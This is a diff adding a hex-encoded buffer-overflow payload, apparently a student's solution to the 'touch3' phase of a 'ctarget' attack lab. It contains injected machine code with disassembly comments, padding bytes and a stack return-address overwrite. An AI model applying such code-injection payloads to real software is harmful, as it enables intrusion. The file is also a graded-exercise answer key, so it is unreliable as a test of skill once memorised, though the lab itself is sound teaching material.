@@ -1,0 +1,18 @@
+/* touch3 for ctarget */
+/* exploit code */
+68 fa 18 40 00       	/* pushq  $0x4018fa */
+48 c7 c7 88 dc 61 55 	/* mov    $0x5561dc88,%rdi */
+48 bd 35 39 62 39 39 	/* movabs $0x6166373939623935,%rbp */
+37 66 61 
+4d 31 e4             	/* xor    %r12,%r12 */
+c3                   	/* retq    */
+/* padding code */
+00 00 
+00 00 00 00
+
+00 00 00 00
+00 00 00 00
+
+/* overwrite stack to exploit codes' address */
+78 dc 61 55
+00 00 00 00
